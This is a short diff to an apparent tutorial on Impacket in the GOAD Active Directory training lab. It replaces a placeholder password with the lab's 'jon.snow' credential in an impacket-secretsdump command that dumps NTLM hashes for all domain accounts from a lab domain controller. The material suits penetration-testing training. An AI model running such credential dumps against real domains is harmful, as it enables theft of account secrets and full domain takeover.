@@ -131,7 +131,7 @@ In the GOAD environment, Impacket is essential for Linux-based attacks:
 3. **Credential Dumping After Privilege Escalation**:
    ```bash
    # Once we have Domain Admin creds (jon.snow), dump everything
-   impacket-secretsdump north.sevenkingdoms.local/jon.snow:password@192.168.56.11 -just-dc-ntlm -outputfile goad-hashes
+   impacket-secretsdump north.sevenkingdoms.local/jon.snow:iknownothing@192.168.56.11 -just-dc-ntlm -outputfile goad-hashes
 
    # This provides NTLM hashes for all domain accounts including:
    # - Administrator
